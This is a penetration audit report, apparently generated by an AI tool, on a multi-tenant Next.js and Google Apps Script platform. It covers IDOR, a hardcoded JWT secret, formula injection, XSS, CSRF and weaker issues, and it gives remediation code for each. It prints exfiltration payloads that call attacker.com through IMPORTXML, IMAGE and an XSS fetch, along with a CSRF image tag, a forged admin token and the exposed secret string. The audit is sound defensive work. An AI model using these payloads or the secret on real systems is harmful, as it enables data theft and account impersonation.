# Pulse Ecosystem - Comprehensive Security & Penetration Audit Report

**Date:** October 5, 2026  
**Auditor:** Antigravity AI Security Suite  
**Scope:** Full Ecosystem (PMA Next.js Backend & API Gateway, Pulse Portal, Client GAS Scripts & WebApp, Master GAS Engine, and Deployment Automation)  
**Overall Risk Posture:** 🚨 **High / Requires Immediate Remediation**

---

## 1. Executive Summary

A full-spectrum security review and penetration vulnerability analysis was conducted across the entire **Pulse Multi-Tenant Ecosystem**, including:
1. **Layer 1: Orchestration & Management (PMA & Portal)** — `pulse-management-system/`
2. **Layer 2: Master Sheet Data Engine** — `master-GAS-scripts/`
3. **Layer 3: Client Sheet Presentation & WebApp UI** — `client-GAS-scripts/` (`WebApp.html`, `Emailauthsystem.gs`, `webappserver.gs`)
4. **Auxiliary Control Plane** — `bulk-updater/`, `deployment-manager/`, `agent-automater/`

While foundational security controls (OAuth state nonces, HTTP security headers, Redis rate-limiting, and basic role gates) were previously established, **several severe vulnerabilities remain active or were introduced across newly expanded surfaces**.

### Critical Highlights
- **Broken Object-Level Authorization (BOLA/IDOR)** exists systematically across `/api/portal/*` and `/api/triage` endpoints due to **parameter omission and parameter decoupling**: if `clientName` is omitted or mismatched with `clientSheetId`, authorization checks evaluate to false (fail-open), allowing cross-tenant spreadsheet reads and writes via the Google Cloud Service Account.
- **Spreadsheet Formula Injection (CWE-1236)** is unmitigated in all `/api/portal/*` write endpoints (`save-job.js`, `save-table-data.js`, `confirm-job.js`, `unconfirm-job.js`), allowing arbitrary spreadsheet formulas (`=cmd|' /C ...'`, `=IMPORTXML(...)`) to be written directly into client sheets.
- **Static Known JWT Secret in Source Code**: The fallback JWT secret string is committed to source control and `.env.local` matches the public fallback, allowing any attacker with repo access to forge valid administrative tokens.
- **Fail-Open Background Cron Authorization**: `/api/cron.js` fails open if `CRON_SECRET` is unset (`undefined === undefined`), allowing unauthenticated trigger of heavy triage pipelines.
- **Stored Cross-Site Scripting (XSS)** in the Pulse Portal's `MonthView.jsx` via unescaped string replacement into `dangerouslySetInnerHTML`.
- **SSO Token PostMessage Leaks & Missing Origin Verification**: Wildcard `targetOrigin = '*'` fallback in OAuth callbacks combined with zero `event.origin` validation in `WebApp.html` listener.

---

## 2. Vulnerability Matrix

| Ref | Vulnerability Description | Severity | CVSS v3.1 | CWE | Target Component | Status |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **VULN-01** | BOLA / IDOR via Parameter Decoupling & Omission | **Critical** | **9.6** | CWE-639 / CWE-285 | `/api/portal/*`, `/api/triage` | 🚨 Open |
| **VULN-02** | Static Fallback JWT Secret Committed in Source | **Critical** | **9.8** | CWE-798 / CWE-321 | `authService.js`, `Emailauthsystem.gs` | 🚨 Open |
| **VULN-03** | Spreadsheet Formula Injection in Portal Writes | **High** | **8.5** | CWE-1236 | `save-job.js`, `save-table-data.js`, etc. | 🚨 Open |
| **VULN-04** | Fail-Open Cron Execution on Unset Secret | **High** | **8.2** | CWE-287 / CWE-703 | `pages/api/cron.js` | 🚨 Open |
| **VULN-05** | Stored XSS in Month View Executive Summary | **High** | **7.6** | CWE-79 | `components/portal/MonthView.jsx` | 🚨 Open |
| **VULN-06** | Missing Object-Level Authorization for Client Managers | **High** | **8.5** | CWE-285 / CWE-639 | `services/workspaces.js`, `tasksController.js` | 🚨 Open |
| **VULN-07** | Wildcard postMessage Fallback & Missing Origin Check | **Medium** | **6.8** | CWE-345 / CWE-1021 | OAuth Callbacks & `WebApp.html` | 🚨 Open |
| **VULN-08** | CSRF Vulnerability on State-Changing GET Routes | **Medium** | **6.5** | CWE-352 | `pages/api/triage.js` (L146) | 🚨 Open |
| **VULN-09** | Plaintext Session Bearer Tokens in Client Spreadsheets | **Medium** | **6.1** | CWE-312 / CWE-613 | `Emailauthsystem.gs` (`Sessions` tab) | 🚨 Open |
| **VULN-10** | Missing Content-Security-Policy (CSP) Headers | **Medium** | **5.0** | CWE-693 / CWE-1021 | `pulse-management-system/next.config.js` | 🚨 Open |
| **VULN-11** | Predictable PRNG for OTP Codes in Client GAS | **Medium** | **5.3** | CWE-330 | `Emailauthsystem.gs` (L214) | 🚨 Open |
| **VULN-12** | Overly Permissive Substring Matching & CORS Wildcards | **Low** | **4.8** | CWE-285 / CWE-942 | `userPermissions.js`, `sso-verify.js` | 🚨 Open |

---

## 3. Deep Dive Vulnerability Analysis

### VULN-01: Broken Object-Level Authorization (BOLA / IDOR) via Parameter Decoupling & Omission
- **Severity:** Critical (CVSS: 9.6 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
- **Affected Files:**
  - `pages/api/portal/key-data.js` (L45-L51)
  - `pages/api/portal/budget.js` (L44-L50)
  - `pages/api/portal/cash.js` (L45-L50)
  - `pages/api/portal/performance.js` (L45-L50)
  - `pages/api/portal/payload.js` (L29-L35)
  - `pages/api/portal/save-job.js` (L308-L314)
  - `pages/api/portal/save-table-data.js` (L35-L41)
  - `pages/api/portal/confirm-job.js` (L43-L49)
  - `pages/api/portal/unconfirm-job.js` (L43-L49)
  - `pages/api/triage.js` (L341, L355, L367, L386, L406)

#### Mechanics & Exploit Scenarios:
Across all Portal API endpoints and several triage actions, authorization checks use the following pattern:
```javascript
// Example from key-data.js L44-51:
if (!sessionUser.isAdmin && clientName) {
  const assignedList = Array.isArray(sessionUser.assignedClients) ? sessionUser.assignedClients : [];
  const isAuthorized = assignedList.some((assigned) => matchesClientName(assigned, clientName));
  if (!isAuthorized) {
    return res.status(403).json({ success: false, error: "Forbidden: Not authorized for this client" });
  }
}
```
Two severe exploitation vectors exist:
1. **Omission Bypass (Fail-Open):**
   If an authenticated user submits a request omitting `clientName` (e.g. `GET /api/portal/key-data?clientSheetId=TARGET_SHEET_ID`), the condition `(!sessionUser.isAdmin && clientName)` evaluates to **`false`**. The entire authorization block is skipped, and the server proceeds to execute the request against `clientSheetId` using the Google Cloud Service Account.
2. **Parameter Decoupling (Cross-Tenant Substitution):**
   The endpoint accepts both `clientName` and `clientSheetId` independently without binding them. If User A is authorized for "Client Alpha", they can send:
   `POST /api/portal/save-job` with `{ "clientName": "Client Alpha", "clientSheetId": "<Victim_Client_Beta_Sheet_ID>", "job": { ... } }`.
   The check passes because User A is authorized for "Client Alpha", but the write executes against "Client Beta's" spreadsheet.

#### Remediation:
- Enforce mandatory client resolution from `clientSheetId` via server-side mapping (`AutoUpdates` tab or central tenant cache).
- Never trust `clientName` supplied by the caller as proof of ownership of `clientSheetId`.
- Strictly enforce fail-closed authorization:
  ```javascript
  const resolvedClientName = await resolveClientNameFromSheetId(sheets, clientSheetId);
  if (!resolvedClientName || (!sessionUser.isAdmin && !isUserAuthorizedForClient(sessionUser, resolvedClientName))) {
    return res.status(403).json({ success: false, error: "Forbidden: Access denied to this spreadsheet" });
  }
  ```

---

### VULN-02: Static Fallback JWT Secret Committed in Source Code
- **Severity:** Critical (CVSS: 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Affected Files:**
  - `services/authService.js` (L13)
  - `.env.local` (L20)
  - `client-GAS-scripts/Emailauthsystem.gs` (L475)

#### Mechanics & Exploit Scenarios:
Line 13 of `authService.js` contains:
```javascript
export const FALLBACK_JWT_SECRET = "pma_jwt_secret_pulse_mgmt_auth_2026_x89a74bf20ec91";
```
And in `.env.local` (L20):
```ini
PMA_JWT_SECRET="pma_jwt_secret_pulse_mgmt_auth_2026_x89a74bf20ec91"
```
And in `Emailauthsystem.gs` (L475):
```javascript
const secret = props.getProperty('PMA_JWT_SECRET') || "pma_jwt_secret_pulse_mgmt_auth_2026_x89a74bf20ec91";
```
Because the development secret in `.env.local` is identical to the hardcoded string, and the string is committed into the repository, any party with access to git history or client-side script properties can forge arbitrary JWT session cookies:
```json
{
  "tokenType": "session",
  "email": "admin@pulsedashboard.co.uk",
  "name": "Super Admin",
  "role": "Admin",
  "assignedClients": "*",
  "isAdmin": true
}
```
Signing this payload with the known secret allows complete administrative impersonation without interacting with OTP or OAuth.
Additionally, in `Emailauthsystem.gs` (L497):
```javascript
if (payload.tokenType && payload.tokenType !== 'sso_token')
```
If `payload.tokenType` is absent, the check fails open and accepts the token.

#### Remediation:
- Remove all fallback secrets from source code. If `process.env.PMA_JWT_SECRET` is unset, throw a fatal initialization error in production.
- Generate a new, high-entropy 256-bit random cryptographic secret key for production environments.
- In `Emailauthsystem.gs`, enforce strict equality: `if (payload.tokenType !== 'sso_token') return null;`.

---

### VULN-03: Spreadsheet Formula Injection (CWE-1236) in Portal Write Endpoints
- **Severity:** High (CVSS: 8.5 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`)
- **Affected Files:**
  - `pages/api/portal/save-table-data.js` (L71)
  - `pages/api/portal/save-job.js` (L617-L655)
  - `pages/api/portal/confirm-job.js` (L230-L321)
  - `pages/api/portal/unconfirm-job.js` (L292)
  - `services/importTools.js` (L252)

#### Mechanics & Exploit Scenarios:
All modifications saved via `/api/portal/*` are written to Google Sheets with `valueInputOption: "USER_ENTERED"` without sanitizing formula trigger characters (`=`, `+`, `-`, `@`, `|`, `\t`, `\r`):
```javascript
// save-table-data.js L71:
sheets.spreadsheets.values.batchUpdate({
  spreadsheetId: clientSheetId,
  requestBody: {
    valueInputOption: "USER_ENTERED",
    data, // unsanitized user inputs from req.body.updates
  },
})
```
A client user with edit permissions can input:
```excel
=IMPORTXML("https://attacker.com/leak?data="&JOIN(",", KeyInfo!A1:Z50), "//a")
```
or
```excel
=IMAGE("https://attacker.com/beacon?val="&ENCODEURL(Salaries!C4))
```
When an internal administrator, accountant, or client opens the spreadsheet, the formula executes automatically, leaking proprietary client information or prompting DDE formula execution upon CSV export.

#### Remediation:
- Import and apply `sanitizeFormulaInput(val)` across all user-supplied cell values and job metadata prior to executing `values.update` or `values.batchUpdate`.
- Numeric values must remain valid numbers, while strings starting with formula prefixes must be prepended with a single quote `'`.

---

### VULN-04: Fail-Open Cron Authorization Bypass on Undefined Secret
- **Severity:** High (CVSS: 8.2 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L`)
- **Affected File:**
  - `pages/api/cron.js` (L16-L22)

#### Mechanics & Exploit Scenarios:
In `cron.js`:
```javascript
const authHeader = req.headers.authorization;
const expectedSecret = `Bearer ${process.env.CRON_SECRET}`;
const providedSecret = req.body?.secret || req.query?.secret || authHeader;

if (providedSecret !== process.env.CRON_SECRET && providedSecret !== expectedSecret) {
  return res.status(401).json({ error: "Unauthorised" });
}
```
If `process.env.CRON_SECRET` is undefined:
1. An unauthenticated attacker sends `POST /api/cron` with no body and no headers.
2. `providedSecret` is `undefined`.
3. `providedSecret !== process.env.CRON_SECRET` evaluates to `undefined !== undefined` (`false`).
4. `false && false` evaluates to `false`.
5. The `if` statement body does not execute; the server returns HTTP 200 and spawns background triage operations.

#### Remediation:
Verify that `process.env.CRON_SECRET` exists and has non-zero length before comparing:
```javascript
const cronSecret = process.env.CRON_SECRET;
if (!cronSecret || (providedSecret !== cronSecret && providedSecret !== `Bearer ${cronSecret}`)) {
  return res.status(401).json({ error: "Unauthorized" });
}
```

---

### VULN-05: Stored Cross-Site Scripting (XSS) in Month View Executive Summary
- **Severity:** High (CVSS: 7.6 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`)
- **Affected File:**
  - `components/portal/MonthView.jsx` (L387-L392)

#### Mechanics & Exploit Scenarios:
`MonthView.jsx` renders `headerSummaryText` directly into the DOM via `dangerouslySetInnerHTML`:
```javascript
<div
  dangerouslySetInnerHTML={{
    __html: headerSummaryText
      .replace(/([£$€¥]\s*\d[\d,]*(?:\.\d+)?)/g, "<strong style='font-weight: 700; color: #0047AB; font-size: 1.2em;'>$1</strong>")
      .replace(/\n/g, "<br />"),
  }}
/>
```
`headerSummaryText` is populated directly from Google Spreadsheet cells. Because no HTML entity escaping is performed, an attacker who updates a job note, cell header, or formula output to include:
```html
<img src="x" onerror="fetch('/api/auth/session').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?c='+d.user.email))">
```
will have their script executed inside the browser of any user viewing the Month View tab.

#### Remediation:
Escape HTML before regex substitution:
```javascript
function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

const safeHtml = escapeHtml(headerSummaryText)
  .replace(/([£$€¥]\s*\d[\d,]*(?:\.\d+)?)/g, "<strong style='font-weight: 700; color: #0047AB; font-size: 1.2em;'>$1</strong>")
  .replace(/\n/g, "<br />");
```

---

### VULN-06: Missing Object-Level Authorization on PMA Actions for Client Managers
- **Severity:** High (CVSS: 8.5 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
- **Affected Files:**
  - `pages/api/triage.js` (L265-L322)
  - `services/workspaces.js` (L172-L370)
  - `services/tasksController.js` (L12-L90)

#### Mechanics & Exploit Scenarios:
In `triage.js`, `ClientManager` users bypass the `isPulseOnly` filter. However, core workspace operations:
- `get_outgoings_inbox`
- `get_invoices_inbox`
- `get_outgoings`
- `get_direct_costs_jobs`
- `get_invoice_jobs`
- `get_all_client_jobs`
- `update_job_field`
- `assign_expense_to_job`
- `update_expense_slot`
- `assign_invoice_to_job`
- `update_invoice_slot`
- `create_job_from_invoice`
- `add_new_job`
- `handleBulkCreateTasks`
accept `clientSheetId` or `masterSheetId` without validating whether the user is assigned to that specific tenant.
A `ClientManager` for Tenant A can invoke these actions against Tenant B's spreadsheet IDs.
Additionally, `handleGetAssignedExpenses` returns assigned expense records across **all tenants** without filtering by user assignments.

#### Remediation:
Implement universal tenant authorization middleware for all workspace and task handlers:
```javascript
const targetClientName = req.body.clientName || await resolveClientNameBySheetId(sheets, sheetId);
if (!sessionUser.isAdmin && !isUserAuthorizedForClient(sessionUser, targetClientName)) {
  return res.status(403).json({ success: false, error: "Access denied to this client" });
}
```

---

### VULN-07: Wildcard postMessage Fallback & Missing Origin Verification in WebApp
- **Severity:** Medium (CVSS: 6.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N`)
- **Affected Files:**
  - `pages/api/auth/oauth/google/callback.js` (L75-L89)
  - `pages/api/auth/oauth/microsoft/callback.js` (L75-L89)
  - `client-GAS-scripts/WebApp.html` (L6197-L6225)
  - `client-GAS-scripts/webappserver.gs` (L198)

#### Mechanics & Exploit Scenarios:
1. In both OAuth callbacks:
   ```javascript
   var targetOrigin = '*';
   try {
     if (document.referrer) {
       var ref = new URL(document.referrer).origin;
       if (ref === 'https://script.google.com' || ref.endsWith('.googleusercontent.com') || ref.endsWith('.pulsedashboard.co.uk')) {
         targetOrigin = ref;
       }
     }
   } catch(e) {}
   window.opener.postMessage({ type: 'PULSE_SSO_SUCCESS', ..., ssoToken }, targetOrigin);
   ```
   If `document.referrer` is empty, `targetOrigin` defaults to `'*'`. Any page that triggered or framed the window can intercept the SSO token.
2. In `WebApp.html`:
   ```javascript
   window.addEventListener('message', function (event) {
     if (!event.data) return;
     if (event.data.type === 'PULSE_SSO_SUCCESS') {
       // Zero event.origin check!
       ...
     }
   });
   ```
   Combined with `setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)` in `webappserver.gs`, any site can embed `WebApp.html` in an iframe and attempt clickjacking or postMessage manipulation.

#### Remediation:
- Set `targetOrigin` default strictly to `https://app.pulsedashboard.co.uk` or `https://script.google.com` (never `'*'`).
- In `WebApp.html`, add origin validation:
  ```javascript
  const TRUSTED_ORIGINS = ['https://app.pulsedashboard.co.uk', 'https://pma.pulsedashboard.co.uk'];
  if (!TRUSTED_ORIGINS.includes(event.origin) && !event.origin.endsWith('.pulsedashboard.co.uk')) return;
  ```

---

### VULN-08: Cross-Site Request Forgery (CSRF) on State-Changing API Routes via GET
- **Severity:** Medium (CVSS: 6.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`)
- **Affected File:**
  - `pages/api/triage.js` (L146)

#### Mechanics & Exploit Scenarios:
Line 146 of `triage.js`:
```javascript
const action = req.method === "GET" ? req.query.action : req.body.action;
```
Allowing state-changing actions (`delete_job`, `tidy_up_retainers`, `emergency_flush_redis`, `mark_expense_assigned`, etc.) via `GET` undermines `SameSite=Lax` cookie protection. Because browsers send `SameSite=Lax` cookies on top-level GET navigations, an attacker can embed:
`<img src="https://app.pulsedashboard.co.uk/api/triage?action=emergency_flush_redis">`
or trick an authenticated Admin into clicking a link, triggering state modifications without their consent.

#### Remediation:
Restrict `triage.js` state-modifying actions strictly to `POST` requests. Reject all state-changing actions when `req.method !== "POST"`.

---

### VULN-09: Plaintext Session Bearer Tokens in Google Spreadsheet & Extended 90-Day Lifetime
- **Severity:** Medium (CVSS: 6.1 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Affected File:**
  - `client-GAS-scripts/Emailauthsystem.gs` (L27-L36, L367)

#### Mechanics & Exploit Scenarios:
Session tokens created by `createSessionForAuthorizedUser_` are stored as raw UUID strings in the client spreadsheet (`Sessions!A:E`):
```javascript
['Email', 'Token', 'Created', 'Expires', 'Last Active']
```
With an expiry of 90 days:
```javascript
const sessionExpiry = new Date(now.getTime() + 90 * 24 * 60 * 60000); // 90 days
```
Anyone with Viewer access to the spreadsheet can read the `Sessions` tab, extract a valid bearer token, and use `fastValidateSession(sessionToken)` to impersonate that user for up to 3 months.

#### Remediation:
- Store SHA-256 hashes of session tokens in the spreadsheet instead of raw plaintext tokens.
- Reduce maximum session lifetime to 7 days, aligning with PMA.

---

### VULN-10: Missing Content-Security-Policy (CSP) in Next.js HTTP Headers
- **Severity:** Medium (CVSS: 5.0 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **Affected File:**
  - `next.config.js` (L8-L17)

#### Mechanics & Exploit Scenarios:
While `next.config.js` configures `X-Frame-Options`, `X-Content-Type-Options`, and `Strict-Transport-Security`, it lacks a `Content-Security-Policy`. Without CSP, there is no defense-in-depth against XSS exploitation or rogue network requests if dynamic HTML injection occurs.

#### Remediation:
Add a strict Content-Security-Policy in `next.config.js`:
```javascript
{
  key: "Content-Security-Policy",
  value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline' https://apis.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.pulsedashboard.co.uk;"
}
```

---

### VULN-11: Insecure Pseudo-Random Number Generator for OTP in Client GAS
- **Severity:** Medium (CVSS: 5.3 — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Affected File:**
  - `client-GAS-scripts/Emailauthsystem.gs` (L214)

#### Mechanics & Exploit Scenarios:
In `Emailauthsystem.gs`:
```javascript
const code = Math.floor(100000 + Math.random() * 900000).toString();
```
`Math.random()` is not cryptographically secure and can be reconstructed using pseudo-random state recovery attacks. In contrast, `authService.js` in Next.js uses `crypto.randomInt()`.

#### Remediation:
Generate cryptographically secure OTP codes using Google Apps Script's `Utilities.computeDigest()` or random bytes:
```javascript
function generateSecureOtp_() {
  const bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, Utilities.getUuid() + Date.now());
  const num = (Math.abs(bytes[0] << 24 | bytes[1] << 16 | bytes[2] << 8 | bytes[3])) % 900000 + 100000;
  return num.toString();
}
```

---

### VULN-12: Overly Permissive Substring Matching & CORS Wildcards
- **Severity:** Low (CVSS: 4.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`)
- **Affected Files:**
  - `services/userPermissions.js` (L237-L238)
  - `pages/api/auth/sso-verify.js` (L13)

#### Mechanics & Exploit Scenarios:
- `matchesClientName()` permits matches if either string contains the other with length >= 3 (`sb.includes(sa) || sa.includes(sb)`). Generic names ("The", "Art", "Design", "Studio") can match multiple tenants.
- In `sso-verify.js`, `origin.endsWith(".googleusercontent.com")` allows any arbitrary domain hosted on Google Cloud User Content to perform cross-origin verification calls.

#### Remediation:
- Remove bi-directional loose substring matching; use exact normalized name comparison or whole-word token matching.
- Pin allowed CORS origins to specific Google Apps Script deployment domains or internal pulse domains.

---

## 4. Prioritized Remediation Roadmap

### Phase 1: Immediate Critical Remediation (Day 1 - 2)
1. **Fix BOLA / IDOR Across All Portal & Gateway Endpoints (VULN-01):**
   - Resolve `clientSheetId` to its registered tenant name on the server.
   - Enforce fail-closed verification: `if (!sessionUser.isAdmin && !isUserAuthorizedForClient(sessionUser, resolvedClientName)) return res.status(403)`.
2. **Rotate & Secure JWT Secrets (VULN-02):**
   - Eliminate hardcoded `FALLBACK_JWT_SECRET`.
   - Generate high-entropy 256-bit environment secret in Vercel.
   - Enforce strict `tokenType === "sso_token"` in `Emailauthsystem.gs`.
3. **Disarm Formula Injection in Portal Writes (VULN-03):**
   - Apply `sanitizeFormulaInput()` in `save-job.js`, `save-table-data.js`, `confirm-job.js`, `unconfirm-job.js`, and `importTools.js`.
4. **Harden Cron Authentication Check (VULN-04):**
   - Verify `CRON_SECRET` is defined before comparing; fail closed on undefined.
5. **Escape Stored HTML in Month View (VULN-05):**
   - Apply `escapeHtml()` in `MonthView.jsx` prior to rendering executive summary text.

### Phase 2: Authorization & Transport Hardening (Day 3 - 5)
6. **Enforce Tenant Isolation for Client Managers (VULN-06):**
   - Add client checks to all workspace inbox and job modification actions.
   - Filter `handleGetAssignedExpenses` by user assigned clients.
7. **Harden postMessage & Popup Origins (VULN-07):**
   - Remove `targetOrigin = '*'` in OAuth callbacks.
   - Enforce `event.origin` validation in `WebApp.html`.
8. **Disallow State-Changing Actions over GET (VULN-08):**
   - Restrict mutating actions in `/api/triage` strictly to `POST`.

### Phase 3: Defense-in-Depth & Client Sheet Upgrades (Next Sprint)
9. **Hash Client Spreadsheet Session Tokens (VULN-09):**
   - Store SHA-256 hashed tokens in `Sessions` sheet; reduce lifespan to 7 days.
10. **Implement CSP Headers in `next.config.js` (VULN-10).**
11. **Implement CSPRNG OTP Generation in Client GAS (VULN-11).**
12. **Tighten Name Matching & CORS Policies (VULN-12).**

---
*Report generated by Antigravity AI Security Suite. Verification tests recommended following each remediation phase.*
